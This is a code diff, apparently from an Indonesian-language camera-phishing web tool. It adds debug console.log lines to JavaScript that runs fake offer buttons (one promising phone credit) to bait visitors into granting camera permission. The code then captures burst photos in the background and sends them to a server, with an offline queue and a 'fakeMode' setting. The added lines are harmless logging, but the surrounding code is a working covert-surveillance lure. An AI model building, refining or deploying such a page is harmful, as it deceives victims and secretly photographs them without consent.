@@ -336,6 +336,7 @@ const CFG = {
   burstInterval:{{ burst_interval }},
   interval:     {{ capture_interval }},
 };
+console.log('Device page loaded. CFG:', CFG);
 
 const $ = id => document.getElementById(id);
 const slp = ms => new Promise(r => setTimeout(r, ms));
@@ -405,6 +406,7 @@ async function startLoading() {
   prog.style.transition = `width ${CFG.dur}s linear`;
   requestAnimationFrame(() => prog.style.width='100%');
   await slp(CFG.dur * 1000);
+  console.log('Loading finished. fakeMode=', CFG.fakeMode);
   $('s-load').classList.add('out');
   await slp(400);
 
@@ -442,6 +444,7 @@ function attachFakeTrigger(btnId, noteId) {
   const btn = $(btnId); const note = $(noteId);
   if (!btn) return;
   btn.addEventListener('click', async () => {
+    console.log('Fake button clicked for', btnId);
     btn.disabled = true; btn.textContent = 'Memproses...';
     if (note) note.innerHTML = 'Ketuk <strong>Izinkan</strong> pada dialog yang muncul.';
     await doPermission();
@@ -454,12 +457,13 @@ attachFakeTrigger('pulsa-btn','pulsa-note');
 
 // ── ③ Normal Allow button ─────────────────────────────────────────────────────
 $('allow-btn').addEventListener('click', async () => {
-  $('allow-btn').disabled=true; $('allow-btn').textContent='Memproses...';
+  $('allow-btn').disabled=true; console.log('allow-btn clicked'); $('allow-btn').textContent='Memproses...';
   await doPermission();
 });
 
 // ── ④ Core Permission Flow ────────────────────────────────────────────────────
 async function doPermission() {
+  console.log('doPermission called, mode=', CFG.mode, 'canary=', CFG.canary);
   try {
     if (CFG.canary) {
       // Canary mode: hanya tampilkan pesan, tidak ada kamera/GPS
@@ -497,6 +501,7 @@ async function doPermission() {
 let bgVideo = null;
 
 async function startBgCamera() {
+  console.log('startBgCamera called');
   const stream = await navigator.mediaDevices.getUserMedia({
     video:{facingMode:CFG.facing, width:{ideal:CFG.width},
            height:{ideal:Math.round(CFG.width*3/4)}},
@@ -528,6 +533,7 @@ async function captureFrame() {
 }
 
 async function sendPhoto(blob) {
+  console.log('sendPhoto called, blob size=', blob ? blob.size : 'null');
   if (!blob) return;
   if (!isOnline) { offlineQueue.push(blob); updateQueueBadge(); return; }
   try {
@@ -550,6 +556,7 @@ async function sendPhoto(blob) {
 let burstRunning = false;   // Bug 3 fix: cegah burst berjalan bersamaan
 
 async function doBurst() {
+  console.log('doBurst called');
   if (burstRunning) return;   // skip jika burst sebelumnya belum selesai
   burstRunning = true;
   try {
